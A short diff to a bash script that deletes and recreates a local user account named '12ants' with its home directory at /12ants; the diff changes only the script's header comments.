@@ -1,5 +1,7 @@
 #!/bin/bash
-## add user 12ants
+## 
+## 0000/etc/add_user.sh
+## About: Add another user to this shell.
 ##
 deluser 12ants 2>/dev/null; rm /12ants -r 2>/dev/null
 useradd -G ""$SUDO_USER"" -m 12ants -r -d /12ants;
